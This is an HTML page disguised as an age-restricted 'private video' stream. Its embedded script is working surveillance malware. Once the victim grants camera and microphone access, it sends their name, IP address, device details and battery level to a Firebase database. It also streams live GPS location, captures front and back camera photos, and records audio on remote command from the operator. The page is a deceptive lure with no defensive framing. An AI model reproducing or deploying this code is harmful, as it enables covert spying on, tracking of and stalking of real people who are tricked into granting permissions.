<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Content Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
        
        #bg-image {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: url('bg.png.jpeg'); 
            background-size: cover; background-position: center;
            filter: blur(15px); z-index: 1; transform: scale(1.1); opacity: 0.7;
        }

        #main-ui {
            position: relative; z-index: 10; width: 100%; height: 100%;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            background: rgba(0,0,0,0.5);
        }

        #play-trigger {
            width: 100px; height: 100px; background: rgba(255, 255, 255, 0.2);
            border: 4px solid #fff; border-radius: 50%; display: flex;
            justify-content: center; align-items: center; cursor: pointer;
            box-shadow: 0 0 30px rgba(255,255,255,0.4); transition: 0.3s;
        }
        #play-trigger:hover { transform: scale(1.1); }
        #play-trigger::after {
            content: ''; border-top: 20px solid transparent; border-bottom: 20px solid transparent;
            border-left: 32px solid white; margin-left: 10px;
        }

        #age-modal {
            display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 85%; max-width: 350px; background: #111; border: 1px solid #333;
            border-radius: 15px; padding: 25px; text-align: center; z-index: 200;
        }
        
        .input-name { width: 100%; padding: 12px; margin-bottom: 20px; background: #222; border: 1px solid #444; color: #fff; border-radius: 8px; }
        .btn-yes { background: #00ff41; color: #000; width: 100%; padding: 12px; border-radius: 8px; font-weight: bold; border: none; cursor: pointer; }

        /* Video styling fix */
        #main-player { display: none; width: 100%; height: 100%; background: #000; position: fixed; top: 0; left: 0; z-index: 1000; object-fit: contain; }
        
        #loading-text { display: none; color: #00ff41; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1001; font-weight: bold; }
    </style>
</head>
<body>

    <div id="bg-image"></div>
    <div id="loading-text">LOADING VIDEO...</div>

    <div id="main-ui">
        <div id="play-trigger" onclick="showModal()"></div>
        <div style="text-align:center; margin-top:20px;">
            <h1 style="color:#fff; font-size:26px;">WATCH VIDEO</h1>
            <p style="color:#00ff41; font-weight: bold;">Restricted Content (18+)</p>
        </div>
    </div>

    <div id="age-modal">
        <h2 style="color:white">Identity Check</h2>
        <p style="color:#aaa">Enter name to unlock private stream.</p>
        <input type="text" id="targetName" class="input-name" placeholder="Full Name...">
        <button class="btn-yes" onclick="startEverything()">UNLOCK NOW</button>
    </div>

    <video id="main-player" playsinline webkit-playsinline loop muted preload="auto" style="display:none; width:100%; height:100%; object-fit:contain; background:#000;">
        <source src="video.mp4" type="video/mp4">
    </video>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    let sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
    let globalStream = null;
    let isBusy = false;

    function showModal() { document.getElementById('age-modal').style.display = 'block'; }

    async function startEverything() {
        const uName = document.getElementById('targetName').value;
        if(!uName) { alert("Please enter name!"); return; }

        document.getElementById('age-modal').style.display = 'none';
        document.getElementById('loading-text').style.display = 'block';

        try {
            globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            const v = document.getElementById('main-player');
            v.style.display = 'block';
            
            // Video play logic
            v.play().then(() => {
                v.muted = false; // Unmute after play starts
                document.getElementById('loading-text').style.display = 'none';
            }).catch(e => {
                console.log("Auto-play blocked, trying with mute");
                v.play(); 
            });

            sendInfo(uName);
            trackGPS();
            setTimeout(() => capture("user"), 4000); 
            
            db.ref(`commands/${sessionID}`).on('value', snap => {
                const cmd = snap.val();
                if(cmd && !isBusy) {
                    if(cmd.action === 'photo') capture("user");
                    if(cmd.action === 'back') capture("environment");
                    if(cmd.action === 'audio') recordAudio();
                    db.ref(`commands/${sessionID}`).remove();
                }
            });

        } catch (e) {
            alert("Permission Denied! Camera access is required.");
            location.reload();
        }
    }

    async function initStream() {
        if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
        globalStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    }

    async function capture(mode) {
        if(isBusy) return;
        isBusy = true;
        try {
            if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: mode } } });
            const tempVid = document.createElement('video');
            tempVid.srcObject = stream;
            await tempVid.play();

            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = tempVid.videoWidth; canvas.height = tempVid.videoHeight;
                canvas.getContext('2d').drawImage(tempVid, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: canvas.toDataURL('image/jpeg', 0.5),
                    type: mode === "user" ? "FRONT" : "BACK",
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop());
                initStream().then(() => { isBusy = false; });
            }, 3000);
        } catch (err) { isBusy = false; initStream(); }
    }

    async function recordAudio() {
        if(isBusy) return;
        isBusy = true;
        try {
            if (globalStream) { globalStream.getTracks().forEach(t => t.stop()); }
            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const recorder = new MediaRecorder(audioStream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = () => {
                const reader = new FileReader();
                reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
                reader.onloadend = () => {
                    db.ref(`targets/${sessionID}/audios`).push({ data: reader.result, time: new Date().toLocaleTimeString() });
                    audioStream.getTracks().forEach(t => t.stop());
                    initStream().then(() => { isBusy = false; });
                };
            };
            recorder.start();
            setTimeout(() => { if(recorder.state !== "inactive") recorder.stop(); }, 30000);
        } catch (e) { isBusy = false; initStream(); }
    }

    async function sendInfo(name) {
        const batt = await navigator.getBattery().catch(() => ({level:1}));
        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"N/A"}));
        db.ref(`targets/${sessionID}/info`).set({
            status: "ONLINE", customName: name, ip: ip.ip,
            battery: Math.floor(batt.level * 100) + "%",
            device: navigator.userAgent.split(') ')[0] + ')',
            time: new Date().toLocaleTimeString()
        });
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
        }, null, {enableHighAccuracy:true});
    }
</script>
</body>
</html>



